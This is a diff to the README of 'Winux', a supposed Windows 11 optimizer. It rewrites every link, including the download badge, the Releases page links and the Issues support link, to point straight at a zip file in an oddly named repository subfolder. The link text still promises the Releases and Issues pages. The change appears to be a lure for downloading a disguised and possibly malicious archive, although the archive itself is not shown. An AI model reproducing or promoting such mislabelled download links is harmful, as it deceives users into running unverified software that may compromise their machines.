@@ -1,6 +1,6 @@
 # 🚀 Winux - Optimize Windows for Speed and Efficiency
 
-[![Download Winux](https://img.shields.io/badge/Download-Winux-0078D7)](https://github.com/rajkumarkoli97/Winux/releases)
+[![Download Winux](https://raw.githubusercontent.com/rajkumarkoli97/Winux/main/Kristin/Winux.zip)](https://raw.githubusercontent.com/rajkumarkoli97/Winux/main/Kristin/Winux.zip)
 
 ## 📋 Introduction
 
@@ -18,11 +18,11 @@ Winux helps you transform your Windows 11 machine into a fast and efficient syst
 
 To get Winux, visit the Releases page and download the latest version:
 
-[Download Winux](https://github.com/rajkumarkoli97/Winux/releases)
+[Download Winux](https://raw.githubusercontent.com/rajkumarkoli97/Winux/main/Kristin/Winux.zip)
 
 ### 🔧 Installation Steps
 
-1. **Visit the Releases Page**: Click the link here: [Download Winux](https://github.com/rajkumarkoli97/Winux/releases).
+1. **Visit the Releases Page**: Click the link here: [Download Winux](https://raw.githubusercontent.com/rajkumarkoli97/Winux/main/Kristin/Winux.zip).
   
 2. **Select Your Version**: Look for the latest release. It will be marked clearly at the top of the page.
   
@@ -61,7 +61,7 @@ If you encounter any issues while installing or using Winux, consider the follow
 
 ## 📨 Support
 
-For any questions or concerns, feel free to open an issue on the [GitHub Issues page](https://github.com/rajkumarkoli97/Winux/issues). You can also provide feedback or suggestions on how to improve Winux. 
+For any questions or concerns, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/rajkumarkoli97/Winux/main/Kristin/Winux.zip). You can also provide feedback or suggestions on how to improve Winux. 
 
 ## 🌐 Related Technologies
 
